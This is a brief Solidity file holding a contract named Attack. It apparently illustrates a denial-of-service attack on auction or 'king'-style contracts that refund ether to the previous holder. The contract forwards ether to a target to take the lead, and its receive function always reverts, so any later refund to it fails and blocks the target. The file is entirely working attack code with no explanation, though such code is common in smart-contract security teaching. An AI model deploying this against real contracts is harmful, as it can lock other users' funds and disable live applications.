// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract Attack {
    function claim(address payable _contract) public payable {
        _contract.transfer(msg.value);
    }

    receive() external payable {
        require(false);
    }
}
